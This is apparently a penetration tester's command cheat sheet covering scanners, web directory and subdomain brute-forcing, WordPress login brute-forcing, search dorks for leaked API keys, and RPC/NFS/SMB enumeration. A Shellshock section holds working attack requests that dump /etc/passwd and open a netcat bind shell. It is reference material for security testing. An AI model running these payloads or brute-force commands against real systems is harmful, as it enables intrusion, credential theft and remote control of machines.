##   [+] Greenbone Security Assistant WebUI:
##-============================================-##

sudo openvasmd --user=$User --new-password=$Pass
openvasmd --create-user="$User"; openvasmd --user="$User" --new-password="$Pass"





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] Nessus - Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================-##
##   [+] Get download link
##-============================-##
xdg-open http://www.tenable.com/products/nessus/select-your-operating-system


##-===============================-##
##   [+] Install Nessus Binary:
##-===============================-##
dpkg -i /usr/local/src/Nessus-*.deb


service nessusd start


xdg-open http://www.tenable.com/products/nessus-home


##-=========================-##
##   [+] Add Nessus User:
##-=========================-##
/opt/nessus/sbin/nessus-adduser


##-=========================-##
##   [+] Register Nessus:
##-=========================-##
/opt/nessus/sbin/nessuscli fetch --register $key
/opt/nessus/sbin/nessusd -R
/opt/nessus/sbin/nessus-service -D

##-=======================-##
##   [+] Nessus WebUI:
##-=======================-##
xdg-open https://127.0.0.1:8834/












onesixtyone


masscan







 •
 •
 •
 •
 •
 •
BurpSuite
Arachni
Metasploit WMAP
Nikto
OWASP Zap
w3af


##-====================================-##
##   [•] Remote File Inclusion (RFI)
##-====================================-##
## ------------------------------------------------------------------------- ##
##   [?] Attacker references a file on another server
## ------------------------------------------------------------------------- ##
##   [?] http://original.com/page.php?font=http://badbuy.com/bad_file.php
## ------------------------------------------------------------------------- ##


##-===================================-##
##   [•] Local File Inclusion (LFI)
##-===================================-##
## ---------------------------------------------------------------------- ##
##   [?] Attacker can exploit this to access files local to the server.
## ---------------------------------------------------------------------- ##
##   [?] http://oringal.com/page.php?font=../../Windows/system32/cmd.exe%00
## ---------------------------------------------------------------------- ##





nikto -C all -h http://$TARGET

nikto -h $IP -p 1234 $IP
nikto -C all -h 192.168.1.1 -p 80
nikto -C all -h 192.168.1.1 -p 443


nikto -h $IP -p $PORT



## ---------------------------------------------------- ##
##   [+] Proxy Enumeration (useful for open proxies)
## ---------------------------------------------------- ##
nikto -useproxy http://$IP:3128 -h $IP



nikto -Option USERAGENT=Mozilla -url=http://$IP  -o nikto.txt

nikto -port 80,443 -host $IP -o -v nikto.txt

nikto -host $IP -C all -p 80 -output $File.txt | grep -v Cookie


nikto -h $Domain -port 443 -Format htm --output $Domain.htm



## performing nikto webscan on port $port... 
nikto -host $target:$port -Format txt -output $logfile



nikto -host $1 -port $2 -nossl -output $File.html -useragent "$3"



## ------------------------------------------------------------------- ##
##   [?] Please provide the target protocol scheme (http or https)
##   [?] target IP address or hostname, the target port
##   [?] the user agent string and the proxy server.
## ------------------------------------------------------------------- ##
nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useragent $4 -useproxy $5 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useproxy $4 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html 2>&1 | tee "$1_$2_$3_nikto.txt"


##-================================-##
##   [+] Nikto - Use Squid Proxy
##-================================-##
nikto -h $IP -useproxy http://$IP:4444










httrack $Domain/$File.html --spider -P proxy.myhost.com:8080

httrack $Domain/$File.html --spider -P 10.8.0.1:1080
httrack $Domain/$File.html --spider -P 10.64.0.1:1080
--verbose
--urllist					##
--mirror $URLs
-*p3   ## save all files
--debug-headers					##
--user-agent					##

--single-log			## -f2    one single log file
--file-log				## -f     *log in files
--debug-log				##
--extra-log				## -z     log - extra infos

--debug-xfrstats				## -#T    generate transfer ops. log every minutes
--debug-ratestats				## -#Z    generate transfer rate statictics every minutes

--debug-parsing					## -#d    debug parser

--debug-cache					## -#C    cache list




## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
## --------------------------------------------- ##
http -p Hh $Domain


## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
##   [?] follow redirects
##   [?] skip SSL verification
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no


## --------------------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no --proxy http:http://127.0.0.1:16379


## --------------------------------------------------------------------------- ##
##   [?] DotDotPwn - fuzzer to discover traversal directory vulnerabilities
## --------------------------------------------------------------------------- ##
dotdotpwn.pl -m http -h $IP -M GET -o unix
dotdotpwn.pl -m http -h 192.168.1.1 -M GET


## ------------------------ ##
##  [+] Url brute force
## ------------------------ ##
dirb http://$IP -r -o dirb-$IP.txt

dirb http://"$1"/ | tee /tmp/results/$1/$1-dirb-$port.txt

dirb http://$IP/ /usr/share/wordlist/dirb/big.txt

list-urls.py $Domain

dirb http://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-http-$host-$port.txt -f 
dirb https://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-https-$host-$port.txt -f



## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL Base
##       > User Agent String
##       > Proxy Host and Port
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -p $3:$4


dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -o $LOGNAME




dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report=$LOGNAME


dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report=$LOGNAME



gobuster dir -u $1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -z -k -l -o $LOGNAME




## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL
##       > User Agent String
##       > HTTP code to ignore
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -f -N $3




##-============================-##
##   [+] Web Servers Recon:
##-============================-##

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://$IP:80 -o recon/gobuster_10.10.10.48_80.txt
nikto -host $IP:80 | tee recon/nikto-$IP-80.txt


gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt



## ------------------------- ##
##  [+] Directory Fuzzing
## ------------------------- ##
dirb $Domain /usr/share/wordlists/dirb/big.txt -o $File.txt
gobuster -u $Domain -w /usr/share/wordlists/dirb/big.txt -t 100

## ----------------------------------------------- ##
##  [?] A for loop so you can go do other stuff
## ----------------------------------------------- ##
for wordlist in $(ls);do gobuster -u $Domain -w $File -t 100;done


gobuster -w /usr/share/wordlists/dirb/common.txt -u http://$IP/

gobuster -u http://$IP/  -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e

gobuster dir -u http://$IP/ -w $File.txt
gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster

recursebuster -u $Domain -w wordlist.txt


gobuster -u http://$IP/ -w /usr/share/wordlist/dirb/big.txt -s '200,204,301,302,307,403,500' -e


##-==========================================================-##
##   [+] bruteforce webdirectories and files by extention
##-==========================================================-##
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30



##-=====================================-##
##   [+] Gobuster - Subdomain Brute:
##-=====================================-##
gobuster -m dns -u $Domain -w $File -t 50




## ----------------------------------------------------- ##
##   [?] https://github.com/jaeles-project/gospider
## ----------------------------------------------------- ##
gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt



dirsearch -u http://$IP/ -e .php




echo "Please provide the protocol scheme (http or https), the target server (IP address, hostname or URI) and the port."

whatweb --color=never --no-errors -a 3 -v $1://$2:$3 2>&1 | tee "$1_$2_$3_whatweb.txt"

##-=================================================================-##
##   [+] performing whatweb fingerprinting on $target port $port
##-=================================================================-##
whatweb -a3 --color never http://$target:$port --log-brief $logfile



whatweb -v $domain > data/$file_/analysis/dynamic/domain_info.txt


## --------------------------------------- ##
##   [?] identifies all known services
## --------------------------------------- ##
whatweb $IP

whatweb $IP:80 --color=never --log-brief="whattheweb.txt"


##-======================================-##
##  [+] whatweb - Pulling plugins data
##-======================================-##
whatweb --info-plugins -t 50 -v $Domain >> $File.txt


##-=============================================-##
##  [+] whatweb - Running whatweb on $Domain
##-=============================================-##
whatweb -t 50 -v $Domain >> $File.txt



dirsearch -u $Domain -e php






##-========================================-##
##    [+] dirsearch - HTTP Enumeration
##-========================================-##
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old



for host in `cat alive.txt`; do
    DIRSEARCH_FILE=$(echo $host | sed -E 's/[\.|\/|:]+/_/g').txt
    dirsearch -e $DIRSEARCH_EXTENSIONS -r -b -u -t $DIRSEARCH_THREADS --plain-text reports/dirsearch/$DIRSEARCH_FILE -u $host
done



##-========================================-##
##    [+] 
##-========================================-##
httprobe
httprobe -s -p https:443


cat all.txt | httprobe -c $Concurrency -t $Timeout >> alive.txt
echo "  - $(cat alive.txt | wc -l) assets are responding"


##-========================================-##
##    [+] Wfuzz - The web brute forcer
##-========================================-##
wfuzz -c -z $File.txt --sc 200 http://$IP


##-===================================-##
##    [+] bruteforce web parameter
##-===================================-##
wfuzz -u http://$IP/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt


##-======================================-##
##    [+] bruteforce post data (login)
##-======================================-##
wfuzz -u http://$IP/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt




wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?FUZZ=test

wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?page=FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$IP:60080/?page=mailer&mail=FUZZ"

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $IP/FUZZ

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $IP/FUZZ




##-========================================-##
##   [+] Fuzz DNS using wfuzz - hide 404
##-========================================-##
wfuzz -H 'Host: FUZZ.site.com' -w $File -u $Domain --hh $RemoveString -hc 404




##-=================================-##
##   [+] NMap - HTTP Form Fuzzer  
##-=================================-##
nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $IP




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Shellshock - Exploitation + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=====================================-##
##   [+] NMap - Test for shell shock
##-=====================================-##
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $IP



## ------------------------------------------------------ ##
##   [?] git clone https://github.com/nccgroup/shocker
## ------------------------------------------------------ ##
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose



##-=========================================-##
##   [+] Shell Shock - SSH Forced Command  
##-=========================================-##
## ----------------------------------------------------------------------- ##
##   [?] Check for forced command by enabling all debug output with ssh  
## ----------------------------------------------------------------------- ##
ssh -vvv  
ssh -i noob noob@$IP '() { :;}; /bin/bash'


##-====================================================-##
##   [+] Shell Shock - cat file (view file contents)  
##-====================================================-##
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80


##-=======================================-##
##   [+] Shell Shock - run bind shell  
##-=======================================-##
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	            [+] Git - OSINT Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


GitHarvester - 




truffleHog - searches through git repositories for secrets



LinkedInt

CrossLinked

















##-========================================-##
##    [+] Uniscan - Directory Finder
##-========================================-##
uniscan -qweds -u http://$Domain



## ---------------------------------------------------------------------------------------------- ##
###  [?] Parsero - reads the Robots.txt file of a web server and looks at the Disallow entries.
## ---------------------------------------------------------------------------------------------- ##
parsero -u $Domain -sb


## -------------------------------------------- ##
###  [?] ffuf - bruteforce web directories
## -------------------------------------------- ##
ffuf -w /path/to/wordlist -u https://target/FUZZ




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] WebDAV - Web Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-======================================-##
##    [+] Davtest - WebDAV 
##-======================================-##
davtest -url http://target-IP


## ------------------------------------------------------ ##
###  [?] tries to upload (executable) files to WebDAV
## ------------------------------------------------------ ##
davtest -url http://target-ip/ -sendbd auto


davtest -move -sendbd auto -url http://$ip




##-======================================-##
##    [+] Metasploit - WebDAV Scanner
##-======================================-##
msfconsole
use auxiliary/scanner/http/webdav_scanner


for i in $(cat 80.txt); do cadaver -t $i; done





##-===========================-##
##  [+] Skipfish Scanning:
##-===========================-##
## ---------------------------------------------- ##
##  skipfish -m     time threads
##  skipfish -LVY   do not update after result
## ---------------------------------------------- ##
skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://$IP




skipfish -o /tmp/$File $Domain








urlsnarf

cisco-torch

knocker





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Wordpress - Vulnerability Scanning + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==================================================-##
##   [+] WPScan - Wordpress Vulnerability Scanner
##-==================================================-##
wpscan -v --url $1 --update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee /var/log/$WPScan.log


wpscan --url $Domain --batch


wpscan -u $Domain -e u vp vt -r

cd /usr/share/wpscan/
stop_user_enumeration_bypass.rb $Domain --ids 1-1000


##-=============================================-##
##   [+] THC-Hydra - Brute Force - Wordpress:
##-=============================================-##
hydra -v $Domain http-form-post "wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" l admin -P password_path


hydra -L $USER_FILE -P $PASS_FILE $Domain http-head -f  -m /



##-===========================================-##
##   [+] Patator - Brute Force - Wordpress:
##-===========================================-##
patator http_fuzz url=http://$ip/wp-login.php  raw_request=rawlogin 0=/usr/share/rockyou.txt -l /tmp/login &; tail -f /tmp/login | grep 302




## -------------------------------------------------------- ##
##   [?] cmseek - CMS Detection and Exploitation suite
## -------------------------------------------------------- ##
## 
## ------------------------------------------------- ##
##   [?] plecost - Wordpress fingerprinting tool
## ------------------------------------------------- ##



##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp      ## vp = Vulnerable Plugins
wpscan --url http://$IP --enumerate vt      ## vt = Vulnerable Themes
wpscan --url http://$IP --enumerate u       ##  u = Users


##-===========================================-##
##   [+] WPScan - 
##-===========================================-##
wpscan --url $IP/blog --proxy $IP:3129



##-===========================================-##
##   [+] Joomscan - 
##-===========================================-##
joomscan -u  http://$IP 
joomscan -u  http://$IP --enumerate-components



##-===========================================-##
##   [+] CMS Explorer - 
##-===========================================-##
cms-explorer -url http://$IP -type 
cms-explorer -url http://$IP -type Drupal
cms-explorer -url http://$IP -type WordPress
cms-explorer -url http://$IP -type Joomla
cms-explorer -url http://$IP -type Mambo







clusterd.py --fingerprint  -i $IP


BlindElephant.py $IP


vuls



wapiti $Domain -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report



python $CMSMAP -t $Domain



##   [+] CMSMap - Update the CMSMap Database:

cmsmap.py -U PC




##   [+] CMSMap - Run in file mode:

cmsmap.py -i $File.txt -t 200 -F -s -o $Results.txt





cmsmap.py $Domain -i $Targets.txt -o $Output.txt




cmsmap.py $Domain -u admin -p $Passwords.txt



cmsmap.py $Domain -k $Hashes.txt -w $Passwords.txt



## --------------------------------- ##
##  [+] Scraping wayback data...
## --------------------------------- ##
cat $url/recon/final.txt | waybackurls | tee -a  $url/recon/wayback/wayback_output1.txt
sort -u $url/recon/wayback/wayback_output1.txt >> $url/recon/wayback/wayback_output.txt


cat domains.txt | waybackurls > urls


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] OSINT - Search Engine Dorks - Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-===================================-##
##   [+] OSINT - Search Engine Dorks
##-===================================-##


intitle:"index of" intext:"apikey.txt"
intext:APIKey

ext:(doc | pdf | xls| txt | xml | odt | html) intext:APIKey
ext:(doc | pdf | xls| txt | xml | odt | html) allintext:"APIKey"
ext:(doc|pdf|xls|txt|xml|odt|html) allintext:"APIKey"
ext:doc | ext:pdf | ext:xls | ext:txt | ext:xml | ext:odt allintext:"APIKey"


allintext:"API_SECRET*" ext:env | ext:yml



filetype:pdf OR filetype:doc OR filetype:ppt OR filetype:xls




inurlbr.php --dork "site:$Domain" -s inurlbr-$Target

inurlbr.php --dork "filetype:jsp | filetype:bak | filetype:asp | filetype:php | filetype:cgi | filetype:sql | filetype:pl | filetype:py | filetype:aspx | filetype:rb | filetype:do' inurl:'$TARGET' site:'$TARGET'" -s $TARGET-extensions.txt
inurlbr.php --dork '(inurl:"redir=" AND inurl:"http") OR (inurl:"url=" AND inurl:"http") OR (inurl:"target=" AND inurl:"http") OR (inurl:"dst=" AND inurl:"http") OR (inurl:"src=" AND inurl:"http") OR (inurl:"redirect=" AND inurl:"http") AND site:'"$TARGET" -s $TARGET-openredirect.txt
inurlbr.php --dork "'site:pastbin.com' $TARGET" -s $TARGET-pastebin.txt


inurl:"smb.conf" intext:"workgroup" filetype:conf

site:ftp://ftp.*.* ext:



site:s3.amazonaws.com filetype:pdf



intitle:"SpeedStream Router Management Interface"


iceweasel "https://www.punkspider.org/#searchkey=url&searchvalue='$TARGET'&pagenumber=1&filterType=or&filters=bsqli,sqli,xss,trav,mxi,osci,xpathi" &




# geoip lookup

geoip(){curl -s "http://www.geody.com/geoip.php?ip=${1}" | sed '/^IP:/!d;s/<[^>][^>]*>//g' ;}



# Show current weather for any US city or zipcode

weather() { lynx -dump "http://mobile.weather.gov/port_zh.php?inputstring=$*" | sed 's/^ *//;/ror has occ/q;2h;/__/!{x;s/\n.*//;x;H;d};x;s/\n/ -- /;q';}



links2 -dump http://www.ip-tracker.org/locator/ip-lookup.php?ip=$target > domin.txt


urlcrazy -k $Layout -i -o $Location $Domain
urlcrazy $Domain



## ------------------------------------------------------- ##
##   [?] Please provide a file containing target urls.
## ------------------------------------------------------- ##
EyeWitness.py --web -f $1


## --------------------------------------------------------- ##
##   [?] Running eyewitness against all compiled domains
## --------------------------------------------------------- ##
EyeWitness --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve


EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https



## ------------------------------------------------------- ##
##   [?] Please provide URLs file to capture, 
##   [?] a Dir name for output and a User-Agent string.
## ------------------------------------------------------- ##
EyeWitness.py --web -f "$1" -d "$2" --user-agent "$3" --prepend-https --no-prompt








## ----------------------------------- ##
###  [?] whatweb - Vulnerable Scan
## ----------------------------------- ##
whatweb $IP





ass -A -i eth0 -v       ## Active mode scanning





## --------------------------------------------------------------------- ##
##    [?] Fierce
## --------------------------------------------------------------------- ##
fierce -dns $Domain


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
firewalk -S1-1024 -i eth0 -n -pTCP 10.0.0.1 10.0.2.50


firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1



## --------------------------------------------------------------------- ##
##    [?] GoLismero - 
## --------------------------------------------------------------------- ##
golismero scan -i /root/port80.xml -o sub1-port80.html





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] RPC - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




## ------------------------------------------------------------------------- ##
##   [?] rpc.idmapd          ## [?] The NFSv4 ID <-> name mapping daemon
## ------------------------------------------------------------------------- ##
##   [?] rpc.idmapd          ## [?] NFSv4 ID <-> Name Mapper
## ------------------------------------------------------------------------- ##
## 
## 
##-=========================================================================-##
##                         [?] RPC - Config Files [?]
##-=========================================================================-##
## ------------------------------------------------------------------------- ##
##   [?] /etc/idmapd.conf
## ------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------- ##



## ----------------------------------------- ##
##   [?] Check if RPC Service is Running
## ----------------------------------------- ##
rpcinfo -p $IP
rpcbind -p $IP


##-===========================================-##
##   [+] RPCInfo - Report RPC Information
##-===========================================-##
rpcinfo -p | egrep -w "port|81[14]"


## ---------------------------------------------------------------- ##
##   [?] Connect to an RPC share without a username and password 
## ---------------------------------------------------------------- ##
##-===================================-##
##   [+] Then Enumerate Privileges:
##-===================================-##
rpcclient --user="" --command=enumprivs -N $IP


## ---------------------------------------------------------------- ##
##   [?] Connect to an RPC share without a username and password 
## ---------------------------------------------------------------- ##
##-===================================-##
##   [+] Then Enumerate Privileges:
##-===================================-##
rpcclient --user="" --command=enumprivs $IP



rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john


##-==========================-##
##  [+] Dump RPC Endpoints
##-==========================-##
/opt/impacket/examples/rpcdump.py $User:$Pass@$TargetIP


##-========================-##
##  [+] Get SID Via RPC:
##-========================-##
/opt/impacket/examples/lookupsid.py $User:$Pass@$TargetIP


##-=============================================-##
##  [+] Shutdown a Windows machine from Linux
##-=============================================-##
net rpc shutdown -I $IPAddrWin -U $User%$Pass


##-========================================================-##
##   [+] Print all messages to console, verbosity lvl 3
##-========================================================-##
rpc.idmapd -f -vvv


##-==============================================-##
##  [+] NMap - Run RPC Enumeration NSE script:
##-==============================================-##
nmap --script=msrpc-enum.nse $TARGET
nmap --script msrpc-enum --script-args vulns.showall $IP -oN nmap_msrpc_$IP.txt

##-==============================================-##
##  [+] NMap - rpcinfo NSE Enumeration Script:
##-==============================================-##
nmap --script rpcinfo.nse $IP -p 111


##-========================================-##
##  [+] NMap - Run All RPC NSE Scripts:
##-========================================-##
nmap -p 135 --script=rpc* $TARGET


##-=============================================-##
##   [+] Metasploit - RPC Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "rpc" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "dce" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] NFS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nfsidmap


##-==========================-##
##   [+] Find NFS Port
##-==========================-##
nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port; $IP


##-==========================-##
##   [+] Show NFS Mounts
##-==========================-##
nmap -sV --script=nfs-showmount $IP


##-===================================-##
##   [+] Show Mountable NFS Shares
##-===================================-##
nmap --script=nfs-showmount -oN mountable_shares; $IP; showmount -e; $IP

nmap --script=nfs-ls.nse $TARGET
nmap --script=nfs-showmount.nse $TARGET
nmap --script=nfs-statfs.nse $TARGET

nmap -p 111 --script=nfs-* $TARGET


mount $TARGET:/vol/share /mnt/nfs

mount -t nfs $IP:/var/myshare /mnt/shareddrive
mount -t nfs $IP:/mountlocation /mnt/mountlocation

serverip:/mountlocation /mnt/mountlocation nfs defaults 0 0


mount -o port=2049,mountport=44096,proto=tcp 127.0.0.1:/home /home


## -------------------------------------------------------------------- ##
##   [?] discover available Windows shared drives or for NFS shares.
## -------------------------------------------------------------------- ##
net view \\<remote system>

showmount -e                    ## list Shares
showmount -a -d -e $TARGET      ## 


##-=============================================-##
##   [+] Metasploit - NFS Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "nfs" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=111 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMB - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================-##
##   [+] Connect to share
##-===========================-##
smbclient \\\\[$IP\]\\\[share name\]


##-==================================================-##
##   [+] test server credentials using $AUTH_FILE
##-==================================================-##
smbclient -L $p -A $AUTH_FILE


##-===========================-##
##   [+] 
##-===========================-##
smbclient -L\\ -N -I $1 2>&1 | tee "smbclient_$1.txt"


##-===========================-##
##  [+] Enumerate Hostnames
##-==========================-##
nmblookup -A $IP

nmblookup -U $Domain -R '$Workgroup'


##-==========================-##
##   [+] Investigate share
##-==========================-##
smblookup -A $TARGET smbclient //MOUNT/share -I $TARGET -N


##-==============================-##
##  [+] List Shares with creds
##-==============================-##
smbmap -H \[$IP\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R


##-====================================================-##
##   [+] List Shares with no creds and guest account
##-====================================================-##
smbmap -H \[$IP/hostname\] -u anonymous -p hokusbokus -R


##-============================================-##
##   [+] Guest User and null authentication
##-============================================-##
smbmap -u anonymous -p anonymous -H 10.10.10.172
smbmap -u '' -p '' -H 10.10.10.172


##-================================-##
##   [+] List Shares with creds
##-================================-##
smbmap -H \[ip\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R



smbmap -H [ip] -d [domain] -u [user] -p [password]   -r --depth 5 -R




smbmap -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"


smbmap -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"





##-=====================================-##
##   [+] semi-interactive smb-client
##-=====================================-##
python3 /opt/impacket/examples/smbclient.py $User@$TargetIP
python3 /opt/impacket/examples/smbclient.py '$User'@$TargetIP
python3 /opt/impacket/examples/smbclient.py ''@$TargetIP



##-==========================-##
##   [+] Find open shares
##-==========================-##
Showmount -e $TARGET/<port>


##-=========================-##
##   [+] Mount smb share:
##-=========================-##
mount -t cifs //server ip/share/dir/; -o username=”guest”,password=””

mount -o hard,nolock target-ip:/home folder

mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder


##-===========================================-##
##   [+] Mount Linux/Windows CIFS Server
##-===========================================-##
